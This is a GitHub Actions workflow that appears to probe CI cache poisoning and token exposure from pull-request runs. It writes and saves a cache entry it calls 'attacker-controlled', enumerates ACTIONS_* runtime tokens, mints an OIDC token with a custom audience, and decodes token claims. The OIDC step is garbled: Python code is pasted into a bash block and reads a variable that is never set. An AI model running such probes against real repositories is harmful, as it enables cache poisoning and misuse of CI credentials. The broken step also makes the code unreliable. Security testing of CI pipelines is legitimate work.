name: Dispatch PR Env Results URL

'on':
  pull_request:
  workflow_dispatch:

permissions:
  contents: read
  id-token: write

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Show context
        shell: bash
        run: |
          set -euo pipefail
          echo "EVENT_NAME=$GITHUB_EVENT_NAME"
          echo "REF=$GITHUB_REF"
          echo "REPOSITORY=$GITHUB_REPOSITORY"
          echo "ACTOR=$GITHUB_ACTOR"
          echo "PR_HEAD_SHA=${{ github.event.pull_request.head.sha }}"
          echo "PR_BASE_SHA=${{ github.event.pull_request.base.sha }}"

      - name: Restore seed cache from base SHA (main)
        id: seed_restore
        uses: actions/cache/restore@v4
        with:
          path: seed_cache
          key: ab-seed-${{ github.event.pull_request.base.sha }}

      - name: Read seed cache bytes
        shell: bash
        run: |
          set -euo pipefail
          ls -la seed_cache || true
          if [[ -f seed_cache/seed.txt ]]; then
            echo "seed_txt=$(cat seed_cache/seed.txt)"
          else
            echo "seed_txt=<missing>"
          fi

      - name: Define poison key/canary
        id: poison
        shell: bash
        run: |
          set -euo pipefail
          key="ab-poison-${{ github.event.pull_request.head.sha }}"
          canary="poison-${{ github.event.pull_request.head.sha }}"
          echo "key=$key" | tee -a "$GITHUB_OUTPUT"
          echo "canary=$canary" | tee -a "$GITHUB_OUTPUT"
          echo "POISON_KEY=$key"
          echo "POISON_CANARY=$canary"

      - name: Restore poison cache (should miss on first run)
        id: restore
        uses: actions/cache/restore@v4
        with:
          path: poison_cache
          key: ${{ steps.poison.outputs.key }}

      - name: Write attacker-controlled cache contents
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p poison_cache
          printf '%s\n' "${{ steps.poison.outputs.canary }}" > poison_cache/poison.txt
          ls -la poison_cache
          echo "poison_txt=$(cat poison_cache/poison.txt)"

      - name: Save poison cache
        uses: actions/cache/save@v4
        with:
          path: poison_cache
          key: ${{ steps.poison.outputs.key }}

      - name: ACTIONS_* presence (run step)
        shell: bash
        run: |
          set -euo pipefail
          tok="${ACTIONS_RUNTIME_TOKEN-}"
          res="${ACTIONS_RESULTS_URL-}"
          cache="${ACTIONS_CACHE_URL-}"
          idu="${ACTIONS_ID_TOKEN_REQUEST_URL-}"
          idt="${ACTIONS_ID_TOKEN_REQUEST_TOKEN-}"
          echo "len_ACTIONS_RUNTIME_TOKEN=${#tok}"
          echo "len_ACTIONS_RESULTS_URL=${#res}"
          echo "len_ACTIONS_CACHE_URL=${#cache}"
          echo "len_ACTIONS_ID_TOKEN_REQUEST_URL=${#idu}"
          echo "len_ACTIONS_ID_TOKEN_REQUEST_TOKEN=${#idt}"
          echo "ACTIONS_VARS:"
          env | cut -d= -f1 | grep '^ACTIONS_' | sort

      - name: Try mint OIDC token and print claims
        shell: bash
        run: |
          set -euo pipefail
          if [[ -z "${ACTIONS_ID_TOKEN_REQUEST_URL-}" || -z "${ACTIONS_ID_TOKEN_REQUEST_TOKEN-}" ]]; then
            echo "oidc_env_missing"
            exit 0
          fi
          AUD="apex-black-oidc-test"
          import subprocess
          AUD="apex-black-oidc-test"
          resp = subprocess.check_output(["curl","-sS","-H",f"Authorization: bearer {os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")}",f"{os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL","")}&audience={AUD}"]).decode()
          # Do NOT print the token value; decode payload only
          python3 - <<'PY'
          import base64, json, os, sys
          resp = os.environ.get('RESP','')
          try:
            data = json.loads(resp)
          except Exception as e:
            print('oidc_response_not_json')
            print(resp[:200])
            raise SystemExit(0)
          tok = data.get('value','')
          parts = tok.split('.')
          if len(parts) < 2:
            print('oidc_token_missing_or_not_jwt')
            raise SystemExit(0)
          pl = parts[1] + '=' * (-len(parts[1]) % 4)
          payload = json.loads(base64.urlsafe_b64decode(pl.encode()))
          # print a safe subset of claims
          safe = {k: payload.get(k) for k in [
            'iss','aud','sub','repository','repository_id','ref','sha','workflow','job_workflow_ref',
            'run_id','run_number','run_attempt','actor','actor_id','event_name','environment'
          ] if k in payload}
          print(json.dumps(safe, sort_keys=True))
          PY
        
      - name: Decode runtime token claims (no token)
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import base64, json, os

          t = os.environ.get('ACTIONS_RUNTIME_TOKEN','')
          parts = t.split('.')
          if len(parts) < 2:
              print('not_jwt')
              raise SystemExit
          pl = parts[1] + '=' * (-len(parts[1]) % 4)
          payload = json.loads(base64.urlsafe_b64decode(pl.encode()))
          for k in ['repository_id','repository_visibility','run_id','job_id','ac','scp','trust_tier']:
              if k in payload:
                  print(f"{k}={payload[k]}")
          PY
